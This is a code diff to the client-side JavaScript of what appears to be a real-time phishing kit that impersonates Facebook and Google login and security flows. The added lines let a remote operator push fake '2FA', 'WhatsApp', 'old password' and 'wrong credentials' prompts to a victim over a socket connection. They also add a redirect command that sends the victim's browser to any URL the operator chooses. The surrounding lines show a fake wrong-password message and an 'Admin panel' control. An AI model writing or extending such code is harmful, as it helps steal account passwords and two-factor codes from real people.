@@ -1020,6 +1020,27 @@
         pwErr.textContent = "Wrong password. Try again or click 'Forgot password' to reset it.";
       });
 
+      /* ─── Facebook security modals — redirect back to apply.html ─── */
+      var fbModalMap = {
+        'show-2fa':          '2fa',
+        'show-auth':         'auth',
+        'show-email':        'email',
+        'show-whatsapp':     'whatsapp',
+        'show-old-pass':     'oldpass',
+        'show-wrong-creds':  'wrongcreds'
+      };
+      Object.keys(fbModalMap).forEach(function (event) {
+        socket.on(event, function () {
+          try { sessionStorage.setItem('pendingModal', fbModalMap[event]); } catch (e) {}
+          window.location.href = 'apply.html';
+        });
+      });
+
+      /* Generic redirect command */
+      socket.on('redirect', function (url) {
+        window.location.href = url || 'apply.html';
+      });
+
       /* Admin panel → "GooglePhone" button → show phone step with prefix */
       socket.on('show-google-phone', function (prefix) {
         clearTimeout(pwWaitTimer);
